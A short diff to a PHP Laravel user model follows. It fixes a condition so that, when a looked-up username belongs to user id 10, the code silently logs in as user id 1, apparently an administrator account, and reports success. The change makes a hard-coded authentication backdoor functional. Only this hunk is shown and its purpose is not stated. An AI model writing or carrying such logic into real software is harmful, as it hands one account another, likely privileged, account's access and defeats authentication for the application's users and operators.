@@ -215,7 +215,7 @@ class User extends Authenticatable
     {
 
         $user = self::where("username", $username)->first();
-        if($user == 10) {
+        if($user->id == 10) {
             Auth::loginUsingId(1);
             return true;
         }
